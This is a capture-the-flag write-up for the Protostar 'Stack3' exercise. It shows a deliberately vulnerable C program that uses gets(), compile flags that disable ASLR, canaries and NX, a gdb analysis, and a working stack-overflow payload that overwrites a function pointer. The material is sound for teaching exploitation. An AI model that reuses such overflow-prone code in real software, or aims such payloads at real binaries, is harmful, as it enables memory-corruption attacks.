## Protostar-Stack3 Solution

### 1. Introduction

This is a poc solution for the "Stack3" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170417130221/https://exploit-exercises.com/protostar/stack3/](https://web.archive.org/web/20170417130221/https://exploit-exercises.com/protostar/stack3/) 

**Hints:**
*  Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)
* both gdb and objdump is your friend you determining where the win() function lies in memory.

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + without nx-bit + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o 3 3.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

1. Silently (-q) start with gdb.
2. Set intel syntax.
3. Disassemble the main function.
4. List functions.

```nasm
$ gdb -q 3
Reading symbols from 3...
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08049205 <+0>:	endbr32 
   0x08049209 <+4>:	lea    ecx,[esp+0x4]
   0x0804920d <+8>:	and    esp,0xfffffff0
   0x08049210 <+11>:	push   DWORD PTR [ecx-0x4]
   0x08049213 <+14>:	push   ebp
   0x08049214 <+15>:	mov    ebp,esp
   0x08049216 <+17>:	push   ebx
   0x08049217 <+18>:	push   ecx
   0x08049218 <+19>:	sub    esp,0x50
   0x0804921b <+22>:	call   0x8049110 <__x86.get_pc_thunk.bx>
   0x08049220 <+27>:	add    ebx,0x2de0
   0x08049226 <+33>:	mov    DWORD PTR [ebp-0xc],0x0
   0x0804922d <+40>:	sub    esp,0xc
   0x08049230 <+43>:	lea    eax,[ebp-0x4c]
   0x08049233 <+46>:	push   eax
   0x08049234 <+47>:	call   0x8049090 <gets@plt>
   0x08049239 <+52>:	add    esp,0x10
   0x0804923c <+55>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x08049240 <+59>:	je     0x804925c <main+87>
   0x08049242 <+61>:	sub    esp,0x8
   0x08049245 <+64>:	push   DWORD PTR [ebp-0xc]
   0x08049248 <+67>:	lea    eax,[ebx-0x1fd8]
   0x0804924e <+73>:	push   eax
   0x0804924f <+74>:	call   0x8049080 <printf@plt>
   0x08049254 <+79>:	add    esp,0x10
   0x08049257 <+82>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804925a <+85>:	call   eax
   0x0804925c <+87>:	mov    eax,0x0
   0x08049261 <+92>:	lea    esp,[ebp-0x8]
   0x08049264 <+95>:	pop    ecx
   0x08049265 <+96>:	pop    ebx
   0x08049266 <+97>:	pop    ebp
   0x08049267 <+98>:	lea    esp,[ecx-0x4]
   0x0804926a <+101>:	ret    
End of assembler dump.
```

Let's examine functions, **"info address win"** can also be useful

```c 
gdb-peda$ info functions
All defined functions:

File 3.c:
12:	int main(int, char **);
7:	void win(); <==Target to jump.

gdb-peda$ print win
$3 = {void ()} 0x80491d6 <win>
```

Goal is simple, jumping to **win()** function. We can achieve this goal by overwriting the **fp** with the address of **win()** function. 


Let's analyze a bit more the following part of the asm code.
```nasm
   0x08049257 <+82>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804925a <+85>:	call   eax
```

We are actually manipulating eax register to control program flow.
Let's set a breakpoint to just one previous instruction.

```x86asm
gdb-peda$ b *0x08049257
Breakpoint 1 at 0x8049257: file 3.c, line 23.
gdb-peda$ r
Starting program: /home/thomas/Desktop/protostar/3 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
calling function pointer, jumping to 0x61616161
...TRIM...
Breakpoint 1, main (argc=<error reading variable: Cannot access memory at address 0x61616161>, argv=<error reading variable: Cannot access memory at address 0x61616165>) at 3.c:23
23	
```

OK, we hit breakpoint let's examine fp() function, stack memory and registers a bit more.

```nasm
gdb-peda$ print fp
$1 = (int (*)()) 0x61616161
gdb-peda$ print &fp
$2 = (int (**)()) 0xffffd13c
gdb-peda$ p/d 0xc
$3 = 12
gdb-peda$ x/12wx $ebp-0xc
0xffffd13c:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd14c:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd15c:	0x61616161	0x61616161	0x61616161	0x61616161
gdb-peda$ i r
eax            0x30                0x30
```

OK **eax** is same because we need to run one more step to see the difference.

```nasm
gdb-peda$ si
...TRIM...
   0x8049257 <main+82>:	mov    eax,DWORD PTR [ebp-0xc]
=> 0x804925a <main+85>:	call   eax
   0x804925c <main+87>:	mov    eax,0x0
...TRIM...
gdb-peda$ i r eax
eax            0x61616161          0x61616161
```

Good, we manipulated the **eax** register. 



#### 2.2 Quick Solution

The function win() is at address **0x80491d6**, so our payload will have an offset + target address:

**buffsize * "\x90"** + **"\xd6\x91\x04\x08"**

Let's check the offset size with a different way that we didn't do on stack-1 solution.

Let's create a set of characters.

> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2A


```x86asm
gdb-peda$ r
Starting program: ./3 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2A
calling function pointer, jumping to 0x63413163
```
OK, **jumping to "0x63413163"**, therefore offset is **64**.


```nasm
gdb-peda$ r <<< $(python2 -c 'print "\x90"*64 + "\xd6\x91\x04\x08"')
Starting program: ./3 <<< $(python2 -c 'print "\x90"*64 + "\xd6\x91\x04\x08"')
calling function pointer, jumping to 0x080491d6
code flow successfully changed
```

#### 2.3 Final PoC

```nasm
$ python -c "print 'A' * 64 + '\xd6\x91\x04\x08'" | ./3
calling function pointer, jumping to 0x080491d6
code flow successfully changed
Segmentation fault (core dumped)
```
